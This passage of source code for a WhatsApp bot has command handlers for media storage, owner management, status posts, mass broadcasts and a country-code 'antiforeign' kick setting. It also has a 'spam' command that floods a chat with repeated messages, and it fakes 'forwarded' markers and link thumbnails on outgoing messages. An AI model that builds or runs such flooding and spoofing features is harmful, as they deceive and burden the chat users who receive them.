                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'addvideo':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Whats the video name?')
if (VideoXeon.includes(q)) return replygcyuta("The name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./YutaMedia/video/${q}.mp4`)
fs.writeFileSync('./YutaMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcyuta(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Enter the video name')
if (!VideoXeon.includes(q)) return replygcyuta("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./YutaMedia/video/${q}.mp4`)
replygcyuta(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
replygcyuta(teks)
}
break
case 'addimage':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Whats the image name?')
if (ImageXeon.includes(q)) return replygcyuta("The name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./YutaMedia/image/${q}.jpg`)
fs.writeFileSync('./YutaMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcyuta(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Enter the image name')
if (!ImageXeon.includes(q)) return replygcyuta("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./YutaMedia/image/${q}.jpg`)
replygcyuta(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
replygcyuta(teks)
}
break
case 'addsticker':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Whats the sticker name?')
if (StickerXeon.includes(q)) return replygcyuta("The name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./YutaMedia/sticker/${q}.webp`)
fs.writeFileSync('./YutaMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcyuta(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Enter the sticker name')
if (!StickerXeon.includes(q)) return replygcyuta("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./YutaMedia/sticker/${q}.webp`)
replygcyuta(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
replygcyuta(teks)
}
break
case 'addvn':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return replygcyuta("The name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./YutaMedia/audio/${q}.mp3`)
fs.writeFileSync('./YutaMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcyuta(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (args.length < 1) return replygcyuta('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return replygcyuta("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./YutaMedia/audio/${q}.mp3`)
replygcyuta(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
replygcyuta(teks)
}
break
case 'addzip':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")

if (args.length < 1) return replygcyuta(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcyuta("This name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./YutaMedia/zip/${teks}.zip`)
fs.writeFileSync('./YutaMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcyuta(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")

if (args.length < 1) return replygcyuta('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcyuta("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./YutaMedia/zip/${teks}.zip`)
replygcyuta(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `${setv} ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcyuta(teksooooo)
}
break
case 'addapk':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")

if (args.length < 1) return replygcyuta('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcyuta("This name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./YutaMedia/apk/${teks}.apk`)
fs.writeFileSync('./YutaMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcyuta(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")

if (args.length < 1) return replygcyuta('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcyuta("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./YutaMedia/apk/${teks}.apk`)
replygcyuta(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `${setv} ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcyuta(teksoooooo)
}
break
case 'addpdf':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")

if (args.length < 1) return replygcyuta('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcyuta("This name is already in use")
let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
DocXeon.push(teks)
await fsx.copy(delb, `./YutaMedia/doc/${teks}.pdf`)
fs.writeFileSync('./YutaMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcyuta(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")

if (args.length < 1) return replygcyuta('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcyuta("This name does not exist in the database")
let wanu = DocXeon.indexOf(teks)
DocXeon.splice(wanu, 1)
fs.writeFileSync('./YutaMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./YutaMedia/doc/${teks}.pdf`)
replygcyuta(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocXeon) {
teksoooo += `${setv} ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
replygcyuta(teksoooo)
}
break
			case 'addmsg': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!m.quoted) return replygcyuta('Reply to messages you want to save in the database')
				if (!text) return replygcyuta(`Example : ${prefix + command} file name`)
				let msgs = global.db.data.database
				if (text.toLowerCase() in msgs) return replygcyuta(`'${text}' has been registered in the message list`)
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				replygcyuta(`Successfully added the message to the message list as '${text}'\nAccess with ${prefix}getmsg ${text}\nView the Message With ${prefix}listmsg`)
			}
			break
			case 'delmsg': case 'deletemsg': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text) return replygcyuta('The name of the message you want to delete?')
				let msgs = global.db.data.database
				if (text == 'allmsg') {
					global.db.data.database = {}
					replygcyuta('Successfully deleted all msgs from the message list')
				} else {
					if (!(text.toLowerCase() in msgs)) return replygcyuta(`'${text}' not listed in the message list`)
					delete msgs[text.toLowerCase()]
					replygcyuta(`Successfully deleted '${text}' from the message list`)
				}
			}
			break
			case 'getmsg': {
				if (!text) return replygcyuta(`Example : ${prefix + command} file name\n\nView the list of messages with ${prefix}listmsg`)
				let msgs = global.db.data.database
				if (!(text.toLowerCase() in msgs)) return replygcyuta(`'${text}' not listed in the message list`)
				await Yuta.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			}
			break
			case 'listmsg': {
				let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
				let teks = '「 LIST DATABASE 」\n\n'
				for (let i of seplit) {
					teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${getContentType(i.message)?.replace(/Message/i, '')}\n────────────────────────\n\n`
				}
				replygcyuta(teks)
			}
			break
			case 'addowner':
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!args[0]) return replygcyuta(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Yuta.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcyuta(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
replygcyuta(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!args[0]) return replygcyuta(`Use ${prefix+command} number\nExample ${prefix+command} 6285752535878`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
replygcyuta(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `${setv} ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcyuta(teks)
            }
            break
			case 'shutdown':{
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                replygcyuta(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
                }
            break
			  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcyuta(m.chat)
           }
          break
			case 'getexif': case 'getwm': case 'getwatermark':{
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               replygcyuta(`*Water Mark/Exif of ${botname} is*\n\n${setv} Packname : ${packname}\n${setv} Author : ${author}`)
               }
                break
                case 'getautoblocknumber': case 'getautoblockno': case 'getautoblock':{
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               replygcyuta(`*Auto Block Country Code of ${botname} is*\n\n${setv} Country Code : ${autoblocknumber}\n\n_Note: Once autoblock number is activated, numbers related to this country code will be blocked automatcially_`)
               }
                break
                case 'getantiforeign': case 'getantiforeignno': case 'getantiforeignnumber':{
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               replygcyuta(`*Anti Foreign Country Code of ${botname} is*\n\n${setv} Country Code : ${antiforeignnumber}\n\n_Note: Once antiforeign number is activated in any group chat, only members related to this country code are allowed to stay in the group chat, others will be kicked immediately, if chatted._`)
               }
                break
			case 'setexif':
            case 'setwm':{
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!text) return replygcyuta(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcyuta(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                }
                break
			    case 'creategc': case 'creategroup': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!args.join(" ")) return replygcyuta(`Use ${prefix+command} groupname`)
try {
let cret = await Yuta.groupCreate(args.join(" "), [])
let response = await Yuta.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
Yuta.sendMessage(m.chat, { text:teksop, mentions: await Yuta.parseMention(teksop)}, {quoted:m})
} catch {
	replygcyuta(`Error`)
	}
}
break
			case 'resetuser':
            case 'resetdbuser': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               let totalusernya = db.data.users[0]
               replygcyuta(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
			case 'resethit':
            case 'resettotalhit': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               global.db.data.settings[botNumber].totalhit = 0
               replygcyuta(mess.done)
            }
            break
            case 'setmenu':{
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (!text) return replygcyuta(`There are 8 menu(v1,v2,v3)\nPlease select one\nExample ${prefix + command} v1`)
               if (text.startsWith('v')) {
                  typemenu = text
                  replygcyuta('done')
               } else {
                  replygcyuta(`There are 8 menu(v1,v2,v3)\nPlease select one\nExample ${prefix + command} v1`)
               }
            }
            break
			case 'setreply':{
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (text.startsWith('v')) {
                  typereply = text
                  replygcyuta(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT REPLY 🐛",
"sections":[{"title":"SELECT THE REPLY BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"CHANNEL + LINK THUMB",
"title":"CHOOSE ",
"description":"CHANNEL + LINK THUMB",
"id":"${prefix+command} v4"},
{"header":"LARGE LINK + THUMBNAIL",
"title":"CHOOSE ",
"description":"LARGE LINK + THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"LINK + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"LINK + FAKE THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"QUOTED NORMALLY",
"title":"CHOOSE ",
"description":"QUOTED NORMALLY",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (!q) return replygcyuta('Text?')
               await Yuta.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygcyuta(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (/video/.test(mime)) {
                  var videosw = await Yuta.downloadAndSaveMediaMessage(quoted)
                  await Yuta.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygcyuta(mess.done)
               } else {
                  replygcyuta('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (/image/.test(mime)) {
                  var imagesw = await Yuta.downloadAndSaveMediaMessage(quoted)
                  await Yuta.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygcyuta(mess.done)
               } else {
                  replygcyuta('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (/audio/.test(mime)) {
                  var audiosw = await Yuta.downloadAndSaveMediaMessage(quoted)
                  await Yuta.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygcyuta(mess.done)
               } else {
                  replygcyuta('Reply to audio')
               }
            }
            break
			case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                try {
                let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './YutaMedia/theme/YutaVideo.mp4')
                fs.unlinkSync(delb)
                replygcyuta(mess.done)
                } catch {
                	replygcyuta(`Please reply to a image with caption ${prefix+command}`)
                }
            }
            break
			case 'setimgmenu':
            case 'sim': {
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                try {
                let delb = await Yuta.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './YutaMedia/theme/YutaOkkotsu.jpg')
                fs.unlinkSync(delb)
                replygcyuta(mess.done)
                } catch {
                	replygcyuta(`Please reply to a image with caption ${prefix+command}`)
                }
            }
            break
			case 'bc':
            case 'broadcast': {
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (!text) return replygcyuta('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${ydate} ${ytime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await Yuta.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await Yuta.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await Yuta.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcyuta(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'bcgc':
            case 'bcgroup': {
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!text) return replygcyuta(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await Yuta.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcyuta(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    Yuta.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/YutaOkkotsu.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcyuta(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
			case 'spam':
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
					if (!text) return replygcyuta(`Use ${prefix +command} text|amount`)
				xeonarg = text.split("|")
				if (!xeonarg) return replygcyuta(`Use ${prefix+ command} text|amount`)
				if (Number(xeonarg[1]) >= 50) return replygcyuta('Max 50!')
				if (isNaN(xeonarg[1])) return replygcyuta(`must be a number`)
				for (let i = 0; i < xeonarg[1]; i++){
					Yuta.sendMessage(m.chat, {text: xeonarg[0]})
				}
				break
			case 'antiforeign':{
            	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antiforeignnum = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antiforeignnum = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
